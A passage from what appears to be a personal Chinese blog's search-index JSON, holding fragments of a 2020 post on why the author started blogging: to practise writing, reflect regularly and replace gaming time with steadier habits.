写作确实是一件非常特别的事。虽然我从小就不喜欢写作文，但那是对于应试教育的枯燥任务而言的(我现在仍然很讨厌被他人下任务要求写一篇文章)。应试教育的作文任务及其枯燥乏味，因为在大多数情况下，它是一种外力强迫的行为，而我认为，写作应该是发自内心的。一个人需要表达自己内心的一些想法，从而将其转变为可以看见的文字，这就是一种非常合适的方式，写作过程中的思考对于个人的成长而言也是非常有价值的。 无论一个人文学素养如何、文采如何，在安安静静写字的过程中，他总能够获得快乐的。 ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:2:1","series":null,"tags":["Life","Blog"],"title":"为什么想要写博客","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#关于写作"},{"categories":["文字"],"content":"博客的目的 目的主要有以下几点： 提高文字功底 将一些事情用文字表达出来，并且让大多数阅读者在阅读的过程中都感觉舒服(feel comfortable)，是一种非常值得骄傲的能力。不过现在的我肯定是没有的 :( 归纳总结反思： 每隔一段时间进行总结归纳，是非常好的一个习惯 培养心性与习惯 通过使自己专注于码字，将内心想法慢慢地过一遍，抛去浮躁，沉淀自我 ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:2:2","series":null,"tags":["Life","Blog"],"title":"为什么想要写博客","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#博客的目的"},{"categories":["文字"],"content":"对自己的要求 趁着最近课业任务不多，实验室项目进度要求也不算太急，所以将自己的博客开个头。 现在的我也无法确定能够将写博客这个活动保持多久(因为我真的觉得目前的自己是一个自控能力很差的人)，但我对自己的改变是抱有信心的。既然以前得我总是能够找到玩游戏的时间，那么将这个时间用于写博客，失去的是玩游戏时的浮躁心态和渴望获得快感的不健康心情，获得的是对自己灵魂的调节和放松，岂不是美事一桩 ：） 暂且先将这个博客放在github上，等以后再买个服务器和域名，将博客长久保留下去。 我的目标是能写多久就写多久，并且成为安全/开发行业的上游选手。 ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:3:0","series":null,"tags":["Life","Blog"],"title":"为什么想要写博客","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#对自己的要求"}]